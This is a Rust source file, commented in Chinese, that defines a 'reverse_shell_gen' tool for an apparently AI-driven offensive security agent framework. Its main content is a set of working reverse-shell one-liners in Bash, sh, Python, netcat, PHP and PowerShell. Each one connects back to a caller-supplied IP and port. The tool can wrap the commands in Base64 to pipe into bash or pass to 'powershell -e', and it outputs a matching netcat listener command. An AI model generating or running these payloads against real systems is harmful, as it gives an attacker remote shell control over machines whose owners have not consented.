//! reverse_shell_gen 工具：多语言反弹 Shell 一行载荷与监听命令生成器。
//!
//! 支持 Bash, Python, PowerShell, Netcat, PHP, Sh 等多种语言环境与转义/Base64 封装。

use std::future::Future;
use std::pin::Pin;

use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use cyber_agent::{AgentError, Result, Tool, ToolCtx, ToolOutput, ToolSchema};
use serde_json::{json, Value};

pub struct ReverseShellGenTool;

impl Tool for ReverseShellGenTool {
    fn schema(&self) -> ToolSchema {
        ToolSchema {
            name: "reverse_shell_gen".into(),
            description: "多语言反弹 Shell 载荷生成器。生成适配 Bash, Python, PowerShell, Netcat, PHP 等环境的经过转义与 Base64 包装的单行 Payload 与对应监听命令。".into(),
            tags: vec!["security".into(), "shell".into(), "payload".into()],
            parameters: json!({
                "type": "object",
                "properties": {
                    "ip": {
                        "type": "string",
                        "description": "攻击机监听 IP（如 10.10.14.5）"
                    },
                    "port": {
                        "type": "integer",
                        "description": "攻击机监听端口（如 4444）"
                    },
                    "shell_type": {
                        "type": "string",
                        "enum": ["bash", "python", "powershell", "nc", "php", "sh"],
                        "description": "Shell 类型（默认 bash）"
                    },
                    "encode": {
                        "type": "string",
                        "enum": ["plain", "base64"],
                        "description": "编码方式（默认 plain）"
                    }
                },
                "required": ["ip", "port"]
            }),
        }
    }

    fn run<'a>(
        &'a self,
        input: Value,
        _ctx: &'a ToolCtx,
    ) -> Pin<Box<dyn Future<Output = Result<ToolOutput>> + Send + 'a>> {
        Box::pin(async move {
            let ip = input
                .get("ip")
                .and_then(|v| v.as_str())
                .ok_or_else(|| AgentError::Provider("reverse_shell_gen 缺少 ip".into()))?;

            let port = input
                .get("port")
                .and_then(|v| v.as_u64())
                .ok_or_else(|| AgentError::Provider("reverse_shell_gen 缺少 port".into()))?;

            let shell_type = input
                .get("shell_type")
                .and_then(|v| v.as_str())
                .unwrap_or("bash");

            let encode = input
                .get("encode")
                .and_then(|v| v.as_str())
                .unwrap_or("plain");

            let raw_cmd = match shell_type {
                "bash" => format!("bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
                "sh" => format!("/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1"),
                "python" => format!(
                    "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
                ),
                "nc" => format!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"),
                "php" => format!(
                    "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                ),
                "powershell" => format!(
                    "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
                ),
                _ => format!("bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
            };

            let final_payload = if encode == "base64" {
                if shell_type == "powershell" {
                    let utf16_le: Vec<u8> = raw_cmd
                        .encode_utf16()
                        .flat_map(|u| u.to_le_bytes())
                        .collect();
                    let b64 = STANDARD.encode(&utf16_le);
                    format!("powershell -e {b64}")
                } else {
                    let b64 = STANDARD.encode(raw_cmd.as_bytes());
                    format!("echo {b64} | base64 -d | bash")
                }
            } else {
                raw_cmd
            };

            let res = json!({
                "listener_command": format!("nc -lvnp {port}"),
                "target_payload": final_payload,
                "shell_type": shell_type,
                "target_ip": ip,
                "target_port": port
            });

            Ok(ToolOutput {
                content: serde_json::to_string_pretty(&res).unwrap_or_default(),
                is_error: false,
            })
        })
    }
}
